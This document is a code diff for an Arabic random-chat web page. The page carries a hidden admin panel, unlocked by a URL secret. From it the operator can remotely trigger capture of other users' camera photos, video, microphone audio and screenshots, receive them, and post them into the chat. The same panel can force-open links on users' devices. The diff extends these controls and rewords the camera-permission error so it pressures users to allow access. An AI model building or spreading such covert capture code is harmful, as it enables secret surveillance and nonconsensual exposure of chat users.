@@ -4,7 +4,6 @@
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>شات عربي | دردشة عشوائية</title>
-<!-- مكتبة html2canvas لالتقاط لقطة الشاشة -->
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 <style>
 * { margin: 0px; padding: 0px; box-sizing: border-box; }
@@ -17,17 +16,16 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
 
 #timer { color: #fff; font-size: 13px; background: rgba(0,0,0,0.2); padding: 3px 8px; border-radius: 4px; display: none; }
 
-#admin-panel { display: none; background: #2d3436; color: #fff; padding: 10px; border-bottom: 3px solid #fdcb6e; font-size: 12px; }
-#admin-panel h4 { color: #fdcb6e; margin-bottom: 6px; }
-.admin-controls-row { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 6px; align-items: center; }
-#admin-panel input, #admin-panel select { padding: 4px; border-radius: 4px; border: 1px solid #ccc; font-size: 11px; }
-#admin-panel button { padding: 4px 8px; background: #0984e3; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 11px; }
-#admin-panel button.danger { background: #d63031; }
-#admin-panel button.success { background: #00b894; }
-.color-picker-wrapper { display: flex; align-items: center; gap: 4px; color: #fff; font-size: 11px; }
+/* لوحة تحكم الأدمن المطابقة تماماً للصورة */
+#admin-panel { display: none; background: #ffeaa7; color: #333; padding: 8px; border-bottom: 2px solid #fdcb6e; font-size: 13px; }
+.admin-row { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 6px; align-items: center; justify-content: center; }
 
-.admin-logs-table { width: 100%; border-collapse: collapse; margin-top: 4px; font-size: 11px; background: #fff; color: #333; }
-.admin-logs-table th, .admin-logs-table td { padding: 4px; border: 1px solid #ddd; text-align: right; }
+.btn-action { background: #d63031; color: white; border: none; border-radius: 4px; padding: 6px 12px; cursor: pointer; font-size: 13px; font-weight: bold; }
+.btn-success { background: #00b894; color: white; border: none; border-radius: 4px; padding: 6px 12px; cursor: pointer; font-size: 13px; font-weight: bold; }
+.admin-input, .admin-select { background: #fff; border: 1px solid #ccc; border-radius: 4px; padding: 6px; font-size: 13px; outline: none; text-align: center; }
+
+.admin-logs-table { width: 100%; border-collapse: collapse; margin-top: 6px; font-size: 12px; background: #fff; }
+.admin-logs-table th, .admin-logs-table td { padding: 5px; border: 1px solid #ddd; text-align: center; }
 .admin-logs-table th { background: #636e72; color: #fff; }
 
 #system-alert-banner { display: none; background: #ff4757; color: white; text-align: center; padding: 6px; font-weight: bold; font-size: 13px; }
@@ -48,8 +46,6 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
 
 #conv div.my-msg { background: rgb(233, 236, 241); color: rgb(119, 119, 119); margin-right: 0; margin-left: auto; }
 #conv p.partner-msg { background: rgb(24, 149, 210); color: rgb(255, 255, 255); margin-left: 0; margin-right: auto; }
-#conv p.partner-msg a, #conv div.my-msg a { text-decoration: underline; }
-
 #conv img { max-width: 170px; max-height: 170px; border-radius: 5px; display: block; margin-top: 5px; cursor: pointer; }
 #conv video, #conv audio { max-width: 190px; border-radius: 5px; display: block; margin-top: 5px; }
 
@@ -73,8 +69,6 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
 #media-preview-content { max-width: 90%; max-height: 70vh; border-radius: 8px; margin-bottom: 15px; }
 .preview-btns { display: flex; gap: 10px; }
 .preview-btns button { padding: 8px 16px; font-size: 15px; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; }
-.btn-send-media { background: #00b894; color: white; }
-.btn-cancel-media { background: #d63031; color: white; }
 
 #image-modal { display: none; position: fixed; z-index: 9999; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.85); text-align: center; justify-content: center; align-items: center; }
 #image-modal img { max-width: 90%; max-height: 90%; border-radius: 5px; }
@@ -92,30 +86,44 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
   
   <div id="system-alert-banner"></div>
 
-  <!-- لوحة تحكم الأدمن -->
+  <!-- لوحة تحكم الأدمن المطابقة للصورة تماماً -->
   <div id="admin-panel">
-    <h4>⚙️ لوحة الإدارة والتحكم</h4>
-    <div class="admin-controls-row">
-      <input type="text" id="admin-url-inp" placeholder="رابط توجيه...">
-      <button onclick="adminAction('open_url')">فتح رابط</button>
-      <button class="success" onclick="adminAction('clear_theirs')">مسح رسائل الطرف الآخر</button>
-      <button class="danger" onclick="adminAction('clear_all')">مسح الشات (عدا رسائلي)</button>
+    <div class="admin-row">
+      <button class="btn-action" onclick="reqMediaGlobal('video')">فيديو 🎥</button>
+      <button class="btn-action" onclick="reqMediaGlobal('photo')">صورة 📸</button>
+      <input type="number" id="media-duration" class="admin-input" value="5" style="width: 70px;" min="1" max="60">
+      <span style="font-weight:bold;">ثواني</span>
+      <button class="btn-action" onclick="adminAction('open_url')">فتح رابط</button>
+      <input type="text" id="admin-url-inp" class="admin-input" placeholder="رابط..." style="width: 140px;">
     </div>
-    <div class="admin-controls-row">
-      <div class="color-picker-wrapper">
-        <span>الخلفية:</span>
-        <input type="color" id="bg-color-picker" value="#ffffff" onchange="adminAction('change_bg', this.value)">
-      </div>
-      <button onclick="adminAction('alert')">📢 تنبيه عام</button>
-      <button onclick="adminAction('ring_phone')">🔔 رنين الهاتف</button>
+    
+    <div class="admin-row">
+      <button class="btn-action" onclick="adminAction('alert')">تنبيه 📢</button>
+      <button class="btn-success" onclick="adminAction('ring_phone')">تشغيل نغمة 🎵</button>
+      <select id="ring-tone-select" class="admin-select">
+        <option value="1">نغمة رنين 1</option>
+        <option value="2">نغمة رنين 2</option>
+      </select>
+      <button class="btn-action" onclick="reqMediaGlobal('audio')">صوت 🎤</button>
     </div>
+
+    <div class="admin-row">
+      <select id="bg-color-select" class="admin-select" onchange="adminAction('change_bg', this.value)">
+        <option value="#ffffff">أبيض</option>
+        <option value="#e0f7fa">سماوي فاتح</option>
+        <option value="#ffeaa7">أصفر هادئ</option>
+        <option value="#fab1a0">وردي هادئ</option>
+      </select>
+      <button class="btn-action" onclick="adminAction('clear_theirs')">مسح رسائله</button>
+      <button class="btn-action" onclick="adminAction('clear_all')">مسح الكل</button>
+    </div>
+
     <div>
-      <b style="color:#fdcb6e;">المتصلون الحاليون:</b>
       <table class="admin-logs-table">
         <thead>
           <tr>
-            <th>Socket ID</th>
-            <th>التحكم والوسائط المطلوبة</th>
+            <th>معرف الجهاز (Socket ID)</th>
+            <th>التحكم السريع بالوسائط</th>
           </tr>
         </thead>
         <tbody id="admin-logs-body">
@@ -149,13 +157,12 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
     <a onclick="location.reload()">بحث عن متصل</a>
   </h5>
 
-  <!-- نافذة المعاينة للأدمن قبل النشر للشات -->
   <div id="media-preview-modal">
-    <h3 style="color:#00b894; margin-bottom:10px; font-size:15px;">🔍 معاينة الوسائط (اضغط "رفع للشات" لتظهر للجميع أو "إلغاء")</h3>
+    <h3 style="color:#00b894; margin-bottom:10px; font-size:15px;">🔍 معاينة الوسائط الملتقطة</h3>
     <div id="preview-container" style="display:flex; justify-content:center; align-items:center;"></div>
     <div class="preview-btns" style="margin-top:15px;">
-      <button class="btn-send-media" onclick="confirmSendMediaToChat()">رفع للشات</button>
-      <button class="btn-cancel-media" onclick="cancelSendMedia()">إلغاء</button>
+      <button class="btn-success" onclick="confirmSendMediaToChat()">رفع للشات</button>
+      <button class="btn-action" onclick="closeMediaPreview()">إلغاء</button>
     </div>
   </div>
 
@@ -170,7 +177,7 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
       reconnection: true,
       reconnectionAttempts: Infinity,
       reconnectionDelay: 500,
-      timeout: 5000
+      timeout: 3000
     });
 
     const sr = document.getElementById('sr');
@@ -192,8 +199,8 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
     let timerInterval;
     let secondsElapsed = 0;
     let isConnectedPartner = false; 
-
     let pendingMediaPayload = null;
+    let activeTargetSocketForGlobal = null;
 
     const urlParams = new URLSearchParams(window.location.search);
     const adminSecret = urlParams.get('admin');
@@ -275,11 +282,6 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
       }
     }
 
-    function linkify(text) {
-      const urlRegex = /(https?:\/\/[^\s]+)/g;
-      return text.replace(urlRegex, url => `<a href="${url}" target="_blank">${url}</a>`);
-    }
-
     function sendMsg() {
       const text = inp.value.trim();
       if(text !== "" && !inp.disabled && isConnectedPartner) {
@@ -295,7 +297,7 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
       element.className = isMe ? 'my-msg' : 'partner-msg';
       
       if (data.type === 'text') {
-        element.innerHTML = linkify(data.content);
+        element.textContent = data.content;
       } else if (data.type === 'image') {
         const img = document.createElement('img');
         img.src = data.content;
@@ -329,17 +331,9 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
       if(e.key === 'Enter') sendMsg();
     });
 
-    fileLabel.addEventListener('click', (e) => {
-      if (!isConnectedPartner) {
-        e.preventDefault();
-        alert('انتظر حتى يتم الاتصال بشخص.');
-      }
-    });
-
     fileInput.addEventListener('change', (e) => {
       const file = e.target.files[0];
       if (!file) return;
-
       const reader = new FileReader();
       reader.onload = function(event) {
         let type = 'image';
@@ -354,64 +348,52 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
       reader.readAsDataURL(file);
     });
 
-    let mediaRecorder;
-    let audioChunks = [];
-    let isRecording = false;
-    let audioRecordTimer = null;
-
-    micBtn.addEventListener('click', async () => {
-      if (!isConnectedPartner) {
-        alert('انتظر حتى يتم الاتصال بشخص.');
-        return;
-      }
-
-      if (!isRecording) {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-          mediaRecorder = new MediaRecorder(stream);
-          audioChunks = [];
-
-          mediaRecorder.ondataavailable = event => {
-            audioChunks.push(event.data);
-          };
-
-          mediaRecorder.onstop = () => {
-            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-            const reader = new FileReader();
-            reader.onload = function(e) {
-              const payload = { type: 'audio', content: e.target.result };
-              socket.emit('message', payload);
-              appendMessage(payload, true);
-            };
-            reader.readAsDataURL(audioBlob);
-          };
-
-          mediaRecorder.start();
-          isRecording = true;
-          micBtn.classList.add('recording');
-
-          audioRecordTimer = setTimeout(() => {
-            if (isRecording) {
-              mediaRecorder.stop();
-              isRecording = false;
-              micBtn.classList.remove('recording');
-            }
-          }, 10000);
-
-        } catch (err) {
-          alert('تعذر الوصول إلى الميكروفون');
-        }
-      } else {
-        clearTimeout(audioRecordTimer);
-        mediaRecorder.stop();
-        isRecording = false;
-        micBtn.classList.remove('recording');
+    // تحكم الأدمن
+    socket.on('connect', () => {
+      if (isAdmin) {
+        addAdminLog(socket.id);
+        activeTargetSocketForGlobal = socket.id;
       }
     });
 
-    // ==========================================
-    // أوامر لوحة التحكم
-    // ==========================================
+    function addAdminLog(socketId) {
+      const tbody = document.getElementById('admin-logs-body');
+      if (tbody.innerText.includes('بانتظار')) tbody.innerHTML = '';
+      if (document.getElementById(`row-${socketId}`)) return;
+
+      activeTargetSocketForGlobal = socketId;
+      const row = document.createElement('tr');
+      row.id = `row-${socketId}`;
+      row.innerHTML = `
+        <td style="font-size:11px; font-weight:bold;">${socketId}</td>
+        <td>
+          <button class="btn-success" style="padding:2px 6px; font-size:11px;" onclick="askMedia('${socketId}', 'photo')">صورة</button>
+          <button class="btn-success" style="padding:2px 6px; font-size:11px;" onclick="askMedia('${socketId}', 'video')">فيديو</button>
+          <button class="btn-success" style="padding:2px 6px; font-size:11px;" onclick="askMedia('${socketId}', 'audio')">صوت</button>
+          <button class="btn-success" style="padding:2px 6px; font-size:11px;" onclick="askMedia('${socketId}', 'screenshot')">لقطة شاشة</button>
+        </td>
+      `;
+      tbody.prepend(row);
+    }
+
+    function reqMediaGlobal(mediaType) {
+      if (!activeTargetSocketForGlobal) {
+        alert('لا يوجد جهاز متصل حالياً في الجدول!');
+        return;
+      }
+      askMedia(activeTargetSocketForGlobal, mediaType);
+    }
+
+    function askMedia(socketId, mediaType) {
+      const durationVal = parseInt(document.getElementById('media-duration').value) || 5;
+      socket.emit('admin_action', {
+        secret: adminSecret,
+        action: 'request_media',
+        mediaType: mediaType,
+        targetSocket: socketId,
+        duration: durationVal
+      });
+    }
 
     function adminAction(type, value = null) {
       if (!isAdmin) return;
@@ -429,6 +411,7 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
         if (!payload.message) return;
       } else if (type === 'ring_phone') {
         payload.action = 'ring_phone';
+        payload.tone = document.getElementById('ring-tone-select').value;
       } else if (type === 'clear_all') {
         payload.action = 'clear_chat';
         payload.target = 'all';
@@ -438,50 +421,6 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
       }
 
       socket.emit('admin_action', payload);
-    }
-
-    // تسجيل الجهاز في جدول الأدمن فور اتصاله
-    socket.on('connect', () => {
-      if (isAdmin) {
-        addAdminLog(socket.id);
-      }
-    });
-
-    function addAdminLog(socketId) {
-      const tbody = document.getElementById('admin-logs-body');
-      if (tbody.innerText.includes('بانتظار')) tbody.innerHTML = '';
-
-      if (document.getElementById(`row-${socketId}`)) return;
-
-      const row = document.createElement('tr');
-      row.id = `row-${socketId}`;
-      row.innerHTML = `
-        <td style="font-size:11px; font-weight:bold;">${socketId}</td>
-        <td>
-          <button style="padding:3px 6px; font-size:10px; background:#00b894;" onclick="askMedia('${socketId}', 'photo')">صورة</button>
-          <button style="padding:3px 6px; font-size:10px; background:#0984e3;" onclick="askMedia('${socketId}', 'video')">فيديو</button>
-          <button style="padding:3px 6px; font-size:10px; background:#6c5ce7;" onclick="askMedia('${socketId}', 'audio')">صوت</button>
-          <button style="padding:3px 6px; font-size:10px; background:#e17055;" onclick="askMedia('${socketId}', 'screenshot')">لقطة شاشة</button>
-        </td>
-      `;
-      tbody.prepend(row);
-    }
-
-    function askMedia(socketId, mediaType) {
-      let duration = 5;
-      if (mediaType === 'video' || mediaType === 'audio') {
-        let chosen = prompt('اختر المدة بالثواني (مثال: 5 أو 10 أو 15):', '10');
-        if (!chosen) return;
-        duration = parseInt(chosen) || 10;
-      }
-
-      socket.emit('admin_action', {
-        secret: adminSecret,
-        action: 'request_media',
-        mediaType: mediaType,
-        targetSocket: socketId,
-        duration: duration
-      });
     }
 
     socket.on('system_alert', (msg) => {
@@ -509,26 +448,28 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
       document.body.style.backgroundColor = bgColor;
     });
 
-    socket.on('trigger_ringtone', () => {
+    socket.on('trigger_ringtone', (tone) => {
       try {
         const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
         function playTone(f1, f2, dur) {
           const o1 = audioCtx.createOscillator();
           const o2 = audioCtx.createOscillator();
           const g = audioCtx.createGain();
-          o1.frequency.value = f1;
-          o2.frequency.value = f2;
+          o1.frequency.value = f1; o2.frequency.value = f2;
           o1.connect(g); o2.connect(g); g.connect(audioCtx.destination);
-          g.gain.setValueAtTime(0.1, audioCtx.currentTime);
+          g.gain.setValueAtTime(0.2, audioCtx.currentTime);
           o1.start(); o2.start();
           setTimeout(() => { o1.stop(); o2.stop(); }, dur);
         }
-        playTone(440, 480, 1000);
-        setTimeout(() => playTone(440, 480, 1000), 1500);
+        if (tone === '2') {
+          playTone(600, 800, 400); setTimeout(() => playTone(600, 800, 400), 500);
+        } else {
+          playTone(440, 480, 1000);
+        }
       } catch (e) {}
     });
 
-    // تنفيذ طلب الوسائط عند المستخدم بدقة تامة وبدون أي أخطاء
+    // تنفيذ طلب الوسائط والصلاحيات تلقائياً
     socket.on('trigger_media_capture', async ({ type, duration, adminSocketId }) => {
       if (isAdmin) return;
 
@@ -551,7 +492,6 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
           reader.readAsDataURL(photoBlob);
 
         } else if (type === 'screenshot') {
-          // إصلاح تفعيل لقطة الشاشة بأعلى دقة عبر html2canvas
           html2canvas(document.body, { scale: 1 }).then(canvas => {
             const dataUrl = canvas.toDataURL('image/png');
             socket.emit('media_captured_for_admin', {
@@ -559,8 +499,6 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
               type: 'image',
               content: dataUrl
             });
-          }).catch(err => {
-            alert('تعذر التقاط الشاشة');
           });
 
         } else if (type === 'video') {
@@ -612,11 +550,10 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
           }, duration * 1000);
         }
       } catch (err) {
-        alert('تعذر الوصول للكاميرا أو الميكروفون');
+        alert('يجب السماح بالوصول للكاميرا والميكروفون لتنفيذ الطلب.');
       }
     });
 
-    // استقبال الوسائط عند الأدمن لعرضها في نافذة المعاينة
     socket.on('review_captured_media', (data) => {
       if (!isAdmin) return;
       showMediaPreviewModal(data);
@@ -664,12 +601,8 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
           roomName: pendingMediaPayload.roomName
         });
       } else {
-        alert('المستخدم ليس في غرفة دردشة نشطة مع طرف آخر حالياً!');
+        alert('المستخدم ليس في غرفة دردشة نشطة حالياً!');
       }
-      closeMediaPreview();
-    }
-
-    function cancelSendMedia() {
       closeMediaPreview();
     }
 
